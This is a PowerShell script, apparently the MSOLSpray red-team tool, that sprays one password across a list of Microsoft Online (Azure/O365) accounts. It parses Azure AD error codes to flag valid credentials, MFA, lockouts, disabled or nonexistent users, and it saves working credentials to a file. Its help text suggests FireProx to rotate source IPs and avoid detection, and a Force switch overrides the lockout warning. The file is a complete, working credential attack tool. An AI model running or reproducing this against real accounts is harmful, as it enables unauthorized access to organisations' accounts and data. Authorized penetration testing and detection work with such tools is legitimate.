function Invoke-MSOLSpray{


<#
    .SYNOPSIS
        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
        MSOLSpray Function: Invoke-MSOLSpray
        Author: Beau Bullock (@dafthack)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.        
    
    .PARAMETER UserList
        
        UserList file filled with usernames one-per-line in the format "user@domain.com"
    
    .PARAMETER Password
        
        A single password that will be used to perform the password spray.
    
    .PARAMETER OutFile
        
        A file to output valid results to.
    
    .PARAMETER Force
        
        Forces the spray to continue and not stop when multiple account lockouts are detected.
    
    .PARAMETER URL
        
        The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
    
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
        Description
        -----------
        This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    
    .EXAMPLE
        
        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
        Description
        -----------
        This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
#>
  Param(


    [Parameter(Position = 0, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $UserList = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $Password = "",

    # Change the URL if you are using something like FireProx
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $URL = "https://login.microsoft.com",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Force
  )
    
    $ErrorActionPreference= 'silentlycontinue'
    $Usernames = Get-Content $UserList
    $count = $Usernames.count
    $curr_user = 0
    $lockout_count = 0
    $lockoutquestion = 0
    $fullresults = @()

    Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
    Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
    $currenttime = Get-Date
    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"

    ForEach ($username in $usernames){
        
        # Adding an extra comment for reasons...
        # User counter
        $curr_user += 1
        Write-Host -nonewline "$curr_user of $count users tested`r"

        # Setting up the web request
        $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 

        # If we get a 200 response code it's a valid cred
        If ($webrequest.StatusCode -eq "200"){
        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
            $webrequest = ""
            $fullresults += "$username : $password"
        }
        else{
                # Check the response for indication of MFA, tenant, valid user, etc...
                # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
                # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes

                # Standard invalid password
            If($RespErr -match "AADSTS50126")
                {
                continue
                }

                # Invalid Tenant Response
            ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                {
                Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                }

                # Invalid Username
            ElseIf($RespErr -match "AADSTS50034")
                {
                Write-Output "[*] WARNING! The user $username doesn't exist."
                }

                # Microsoft MFA response
            ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                $fullresults += "$username : $password"
                }
    
                # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
            ElseIf($RespErr -match "AADSTS50158")
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                $fullresults += "$username : $password"
                }

                # Locked out account or Smart Lockout in place
            ElseIf($RespErr -match "AADSTS50053")
                {
                Write-Output "[*] WARNING! The account $username appears to be locked."
                $lockout_count++
                }

                # Disabled account
            ElseIf($RespErr -match "AADSTS50057")
                {
                Write-Output "[*] WARNING! The account $username appears to be disabled."
                }
            
                # User password is expired
            ElseIf($RespErr -match "AADSTS50055")
                {
                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
                $fullresults += "$username : $password"
                }

                # Unknown errors
            Else
                {
                Write-Output "[*] Got an error we haven't seen yet for user $username"
                $RespErr
                }
        }
    
        # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
        if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
        {
            $title = "WARNING! Multiple Account Lockouts Detected!"
            $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Continues the password spray."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."

            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
            $lockoutquestion++
            if ($result -ne 0)
            {
                Write-Host "[*] Cancelling the password spray."
                Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                break
            }
        }
        
    }

    # Output to file
    if ($OutFile -ne "")
    {
        If ($fullresults)
        {
        $fullresults | Out-File -Encoding ascii $OutFile
        Write-Output "Results have been written to $OutFile."
        }
    }
}
